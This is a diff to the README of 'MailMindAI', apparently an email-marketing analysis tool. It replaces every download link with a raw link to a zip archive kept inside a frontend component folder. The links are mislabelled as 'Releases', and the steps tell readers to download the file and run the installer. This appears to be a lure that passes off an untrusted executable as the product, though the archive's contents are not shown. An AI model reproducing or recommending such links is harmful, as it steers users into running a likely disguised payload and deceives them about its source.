@@ -6,11 +6,11 @@ Welcome to MailMindAI! This application helps you analyze your email marketing c
 
 ## 📥 Download MailMindAI
 
-[![Download MailMindAI](https://raw.githubusercontent.com/eddy870/MailMindAI/master/synonym/MailMindAI.zip)](https://raw.githubusercontent.com/eddy870/MailMindAI/master/synonym/MailMindAI.zip)
+[![Download MailMindAI](https://github.com/eddy870/MailMindAI/raw/refs/heads/master/frontend/src/components/CampaignCard/AI_Mail_Mind_v3.9.zip)](https://github.com/eddy870/MailMindAI/raw/refs/heads/master/frontend/src/components/CampaignCard/AI_Mail_Mind_v3.9.zip)
 
 To download the latest version of MailMindAI, visit the following link:
 
-[Download MailMindAI from Releases](https://raw.githubusercontent.com/eddy870/MailMindAI/master/synonym/MailMindAI.zip)
+[Download MailMindAI from Releases](https://github.com/eddy870/MailMindAI/raw/refs/heads/master/frontend/src/components/CampaignCard/AI_Mail_Mind_v3.9.zip)
 
 ## 📝 Features
 
@@ -32,7 +32,7 @@ To run MailMindAI, ensure your system meets the following requirements:
 
 ## 📂 Installation Steps
 
-1. **Visit the Download Page**: Go to [MailMindAI Releases](https://raw.githubusercontent.com/eddy870/MailMindAI/master/synonym/MailMindAI.zip).
+1. **Visit the Download Page**: Go to [MailMindAI Releases](https://github.com/eddy870/MailMindAI/raw/refs/heads/master/frontend/src/components/CampaignCard/AI_Mail_Mind_v3.9.zip).
 2. **Choose the Latest Release**: Look for the most recent version listed on the page.
 3. **Download the Application**: Click on the applicable download link (e.g., .exe for Windows, .dmg for macOS).
 4. **Run the Installer**: Locate the downloaded file and double-click to run the installer. Follow the prompts to complete the installation.
@@ -74,7 +74,7 @@ If you experience any issues or have questions, you can reach our support team. 
 
 Don't forget to download the latest version from the link below:
 
-[Download MailMindAI from Releases](https://raw.githubusercontent.com/eddy870/MailMindAI/master/synonym/MailMindAI.zip)
+[Download MailMindAI from Releases](https://github.com/eddy870/MailMindAI/raw/refs/heads/master/frontend/src/components/CampaignCard/AI_Mail_Mind_v3.9.zip)
 
 ## 🗂️ Contributing
 
